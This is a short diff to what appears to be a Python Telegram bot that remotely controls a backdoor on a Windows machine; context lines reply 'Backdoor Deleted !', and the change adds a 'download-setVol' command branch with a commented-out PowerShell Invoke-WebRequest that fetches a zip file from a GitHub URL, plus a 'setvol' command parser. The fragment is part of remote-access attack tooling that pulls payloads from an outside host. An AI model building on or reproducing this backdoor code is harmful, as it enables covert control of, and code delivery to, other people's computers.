@@ -29,8 +29,14 @@ def answer(update,context):
         
         update.message.reply_text("Backdoor Deleted !")
     
-    elif "download-setVol":
+    elif "download-setVol" in txt:
+        #powershell -c "Invoke-WebRequest -Uri 'https://github.com/CaptainBeluga/TelegramTest/blob/main/project.zip?raw=true' -OutFile 'project.zip'"
         os.system("echo off")
+    
+    elif "setvol" in txt:
+        value = txt.split()[1]
+        print(value)
+
         
     else:
         try:
